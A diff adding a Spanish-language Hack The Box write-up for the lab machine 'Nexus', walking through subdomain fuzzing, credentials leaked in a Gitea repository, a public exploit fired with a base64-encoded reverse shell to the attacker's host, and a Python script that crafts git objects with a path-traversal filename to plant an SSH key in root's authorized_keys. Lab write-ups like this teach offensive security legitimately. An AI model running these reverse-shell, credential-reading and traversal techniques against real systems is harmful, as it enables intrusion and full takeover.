@@ -54,3 +54,460 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.24.0 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
+Agregar `nexus.htb` al archivo `/etc/hosts`
+
+<div style="display: flex; justify-content: center;">
+
+![Web News](@images/writeups/hackthebox/nexus/web-news.png)
+
+</div>
+
+```plaintext
+j.matthew@nexus.htb
+```
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://nexus.htb -H 'Host: FUZZ.nexus.htb' -ic -c -t 100 -fs 154
+```
+
+```plaintext
+billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 8992ms]
+git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 160ms]
+```
+
+Agregar `billing.nexus.htb` y `git.nexus.htb` al archivo `/etc/hosts`
+
+[http://git.nexus.htb/](http://git.nexus.htb/)
+
+[http://git.nexus.htb/admin/krayin-docker-setup/src/branch/main/.env](http://git.nexus.htb/admin/krayin-docker-setup/src/branch/main/.env)
+
+[http://git.nexus.htb/admin/krayin-docker-setup/commit/9b817fa4e073d12fc43952acb09f3067b2f17adf](http://git.nexus.htb/admin/krayin-docker-setup/commit/9b817fa4e073d12fc43952acb09f3067b2f17adf)
+
+```plaintext
+DB_PORT=3306
+DB_DATABASE=krayin
+DB_USERNAME=krayin
+DB_PASSWORD=N27xh!!2ucY04
+```
+
+[http://billing.nexus.htb/admin/login](http://billing.nexus.htb/admin/login)
+
+<div style="display: flex; justify-content: center;">
+
+![Subdomain Billing Login](@images/writeups/hackthebox/nexus/subdomain-billing-login.png)
+
+</div>
+
+<div style="display: flex; justify-content: center;">
+
+![Subdomain Billing Version](@images/writeups/hackthebox/nexus/subdomain-billing-version.png)
+
+</div>
+
+Version: 2.2.0
+
+## Exploitation
+
+[https://github.com/NathanHimself/CVE-2026-38526-PoC](https://github.com/NathanHimself/CVE-2026-38526-PoC)
+
+```bash
+nc -lnvp 1111
+```
+
+```bash
+echo 'bash -i >& /dev/tcp/10.10.14.192/1111 0>&1' | base64
+```
+
+```bash
+python3 exploit.py -t http://billing.nexus.htb -u 'j.matthew@nexus.htb' -p 'N27xh!!2ucY04' -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTIvMTExMSAwPiYxCg==|base64 -d|bash'
+```
+
+```bash
+www-data@nexus:~/krayin$ cat .env
+```
+
+```plaintext
+<SNIP>
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=krayin
+DB_USERNAME=krayin
+DB_PASSWORD=y27xb3ha!!74GbR
+DB_PREFIX=
+<SNIP>
+```
+
+```bash
+www-data@nexus:~/krayin/storage/app/public/tinymce$ su - jones
+```
+
+```bash
+jones@nexus:~$ ls -la
+```
+
+```plaintext
+total 28
+drwxr-x--- 3 jones jones 4096 May 12 12:26 .
+drwxr-xr-x 4 root  root  4096 May 12 12:06 ..
+lrwxrwxrwx 1 root  root     9 May 12 12:26 .bash_history -> /dev/null
+-rw-r--r-- 1 jones jones  220 Mar 23 10:45 .bash_logout
+-rw-r--r-- 1 jones jones 3771 Mar 23 10:45 .bashrc
+drwx------ 2 jones jones 4096 May 12 12:06 .cache
+-rw-r--r-- 1 jones jones  807 Mar 23 10:45 .profile
+-rw-r----- 1 root  jones   33 Jul  2 14:06 user.txt
+```
+
+```bash
+jones@nexus:~$ cat user.txt 
+```
+
+### User flag
+
+<Callout type="success" title="User flag">
+c******************************d
+</Callout>
+
+## Privilege Escalation
+
+```bash
+jones@nexus:~$ ps aux
+```
+
+```plaintext
+<SNIP>
+git         1399  0.2  4.1 2174228 167520 ?      Ssl  14:06   0:59 /usr/local/bin/gitea web --config /etc/gitea/app.ini
+<SNIP>
+```
+
+```bash
+jones@nexus:~$ ls -la /etc/gitea/
+```
+
+```plaintext
+total 24
+drwxr-xr-x   2 root git  4096 May 12 18:37 .
+drwxr-xr-x 114 root root 4096 May 12 12:21 ..
+-rw-r-----   1 git  git  1586 May 12 18:37 app.ini
+-rw-r-----   1 git  git    89 May 11 16:50 template-sync.conf
+-rw-r--r--   1 git  git  4184 May 11 18:47 template-sync.py
+```
+
+```bash
+jones@nexus:~$ cat /etc/gitea/template-sync.py
+```
+
+```python
+<SNIP>
+def sync_template(repo_info):
+    owner = repo_info['owner']['login']
+    name = repo_info['name'].lower()
+    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
+    stage_path = os.path.join(STAGING_DIR, owner, name)
+
+    if not os.path.isdir(bare_path):
+        log("  repo not found: %s" % bare_path)
+        return
+
+    # Read tree entries from the bare repository
+    try:
+        GIT = ['git', '-c', 'safe.directory=*']
+        result = subprocess.run(
+            GIT + ['ls-tree', '-r', 'HEAD'],
+            cwd=bare_path,
+            capture_output=True, text=True, timeout=10
+        )
+        if result.returncode != 0:
+            log("  ls-tree failed: %s" % result.stderr.strip())
+            return
+    except Exception as e:
+        log("  ls-tree error: %s" % e)
+        return
+
+    entries = []
+    for line in result.stdout.strip().split('\n'):
+        if not line:
+            continue
+        parts = line.split('\t', 1)
+        if len(parts) != 2:
+            continue
+        meta, filepath = parts
+        mode, objtype, objhash = meta.split()
+        if objtype == 'blob':
+            entries.append((mode, objhash, filepath))
+
+    if not entries:
+        log("  no files in template")
+        return
+
+    # Extract files to staging directory
+    for mode, objhash, filepath in entries:
+        target = os.path.join(stage_path, filepath)
+        target_dir = os.path.dirname(target)
+
+        try:
+            os.makedirs(target_dir, exist_ok=True)
+            GIT = ['git', '-c', 'safe.directory=*']
+            cat_result = subprocess.run(
+                GIT + ['cat-file', 'blob', objhash],
+                cwd=bare_path,
+                capture_output=True, timeout=10
+            )
+            if cat_result.returncode != 0:
+                continue
+
+            with open(target, 'wb') as f:
+                f.write(cat_result.stdout)
+
+            if mode == '100755':
+                os.chmod(target, 0o755)
+            else:
+                os.chmod(target, 0o644)
+
+            log("  synced: %s" % filepath)
+        except Exception as e:
+            log("  error syncing %s: %s" % (filepath, e))
+<SNIP>
+```
+
+```bash
+jones@nexus:/etc/gitea$ ss -tl
+```
+
+```plaintext
+State               Recv-Q              Send-Q                           Local Address:Port                             Peer Address:Port             Process             
+LISTEN              0                   4096                                 127.0.0.1:3000                                  0.0.0.0:*                                    
+LISTEN              0                   511                                    0.0.0.0:http                                  0.0.0.0:*                                    
+LISTEN              0                   4096                                   0.0.0.0:ssh                                   0.0.0.0:*                                    
+LISTEN              0                   4096                             127.0.0.53%lo:domain                                0.0.0.0:*                                    
+LISTEN              0                   70                                   127.0.0.1:33060                                 0.0.0.0:*                                    
+LISTEN              0                   4096                                127.0.0.54:domain                                0.0.0.0:*                                    
+LISTEN              0                   151                                  127.0.0.1:mysql                                 0.0.0.0:*                                    
+LISTEN              0                   511                                       [::]:http                                     [::]:*                                    
+LISTEN              0                   4096                                      [::]:ssh                                      [::]:*
+```
+
+[https://git-scm.com/book/en/v2/Git-Internals-Plumbing-and-Porcelain](https://git-scm.com/book/en/v2/Git-Internals-Plumbing-and-Porcelain)
+
+```bash
+~/htb ssh -L 3000:127.0.0.1:3000 jones@nexus.htb
+```
+
+<div style="display: flex; justify-content: center;">
+
+![Create Repo](@images/writeups/hackthebox/nexus/gitea-create-repo.png)
+
+</div>
+
+```bash
+git clone http://127.0.0.1:3000/jones/melvin.git
+```
+
+```bash
+ssh-keygen -t ed25519 -f /tmp/root -N ""
+```
+
+`privesc.py`
+
+```python
+#!/usr/bin/env python3
+
+import hashlib
+import os
+import subprocess
+import zlib
+
+WORKDIR = "/home/melvin/htb/melvin"
+PUBLIC_KEY = "/tmp/root.pub"
+
+# Path that the vulnerable sync script will later resolve outside the staging directory.
+TARGET_PATH = b"../../../../../root/.ssh/authorized_keys"
+
+
+def write_object(obj_type: str, content: bytes) -> str:
+    """
+    Create a Git object manually and store it inside .git/objects.
+
+    Git objects are stored as:
+        <type> <size>\0<content>
+
+    The SHA-1 of this data becomes the object's identifier.
+    """
+
+    header = f"{obj_type} {len(content)}".encode() + b"\x00"
+    raw_object = header + content
+
+    sha1 = hashlib.sha1(raw_object).hexdigest()
+
+    object_path = os.path.join(
+        WORKDIR,
+        ".git",
+        "objects",
+        sha1[:2],
+        sha1[2:],
+    )
+
+    os.makedirs(os.path.dirname(object_path), exist_ok=True)
+
+    with open(object_path, "wb") as f:
+        f.write(zlib.compress(raw_object))
+
+    return sha1
+
+
+# ----------------------------------------------------------------------
+# Create an empty repository
+# ----------------------------------------------------------------------
+
+os.makedirs(WORKDIR, exist_ok=True)
+
+subprocess.run(["git", "init"], cwd=WORKDIR, check=True)
+
+subprocess.run(["git", "config", "user.name", "attacker"], cwd=WORKDIR)
+subprocess.run(["git", "config", "user.email", "attacker@example.com"], cwd=WORKDIR)
+
+
+# ----------------------------------------------------------------------
+# Step 1: Create a blob containing our SSH public key
+# ----------------------------------------------------------------------
+
+with open(PUBLIC_KEY, "rb") as f:
+    public_key = f.read()
+
+blob_sha = write_object("blob", public_key)
+
+print(f"Blob: {blob_sha}")
+
+
+# ----------------------------------------------------------------------
+# Step 2: Create a tree with a malicious filename
+#
+# Tree entries have this binary format:
+#
+#   <mode> <filename>\0<20-byte object id>
+#
+# Instead of a normal filename, we use a traversal path.
+# ----------------------------------------------------------------------
+
+tree_entry = (
+    b"100644 "
+    + TARGET_PATH
+    + b"\x00"
+    + bytes.fromhex(blob_sha)
+)
+
+tree_sha = write_object("tree", tree_entry)
+
+print(f"Tree: {tree_sha}")
+
+
+# ----------------------------------------------------------------------
+# Step 3: Create a commit pointing to that tree
+# ----------------------------------------------------------------------
+
+env = {
+    **os.environ,
+    "GIT_AUTHOR_NAME": "jones",
+    "GIT_AUTHOR_EMAIL": "j.matthew@nexus.htb",
+    "GIT_COMMITTER_NAME": "jones",
+    "GIT_COMMITTER_EMAIL": "j.matthew@nexus.htb",
+}
+
+commit_sha = subprocess.run(
+    [
+        "git",
+        "commit-tree",
+        tree_sha,
+        "-m",
+        "Initial commit",
+    ],
+    cwd=WORKDIR,
+    env=env,
+    capture_output=True,
+    text=True,
+    check=True,
+).stdout.strip()
+
+print(f"Commit: {commit_sha}")
+
+print("\nRepository is ready.")
+print("The only remaining step is to push this commit to the template repository.")
+```
+
+```bash
+python3 privesc.py 
+```
+
+```plaintext
+Reinitialized existing Git repository in /home/melvin/htb/melvin/.git/
+Blob: 4016c0d22f742034fa0ddb6175c01a4c638abd10
+Tree: df8d529c19e02cd13fc68ad159b232bacecca973
+Commit: 7dad0dfb562dec6c6e29febd6e2816c48246461f
+
+Repository is ready.
+The only remaining step is to push this commit to the template repository.
+```
+
+```bash
+git push origin 7dad0dfb562dec6c6e29febd6e2816c48246461f:refs/heads/main --force
+```
+
+```plaintext
+warning: unable to access '../../../../../root/.gitattributes': Permission denied
+warning: unable to access '../../../../../root/.ssh/.gitattributes': Permission denied
+Enumerating objects: 3, done.
+Counting objects: 100% (3/3), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 328 bytes | 328.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://localhost:3000/jones/melvin.git
+ * [new branch]      7dad0dfb562dec6c6e29febd6e2816c48246461f -> main
+```
+
+```bash
+jones@nexus:/etc/gitea$ cat /var/log/template-sync.log
+```
+
+```plaintext
+<SNIP>
+[2026-07-02 21:17:38] Template sync starting
+[2026-07-02 21:17:38] Found 1 template repo(s)
+[2026-07-02 21:17:38] Syncing template: jones/melvin
+[2026-07-02 21:17:38]   synced: ../../../../../root/.ssh/authorized_keys
+[2026-07-02 21:17:38] Template sync complete
+```
+
+```bash
+~/htb/melvin ssh -i /tmp/root root@nexus.htb
+```
+
+```bash
+root@nexus:~# ls -la
+```
+
+```plaintext
+total 32
+drwx------  5 root root 4096 Jul  2 14:06 .
+drwxr-xr-x 23 root root 4096 May 12 12:06 ..
+lrwxrwxrwx  1 root root    9 May 12 12:26 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
+drwx------  3 root root 4096 May 12 12:06 .cache
+drwxr-xr-x  3 root root 4096 May 12 12:06 .local
+-rw-r--r--  1 root root  161 Apr 22  2024 .profile
+-rw-r-----  1 root root   33 Jul  2 14:06 root.txt
+drwx------  2 root root 4096 May 12 12:06 .ssh
+```
+
+```bash
+root@nexus:~# cat root.txt
+```
+
+### Root flag
+
+<Callout type="success" title="Root flag">
+3******************************4
+</Callout>
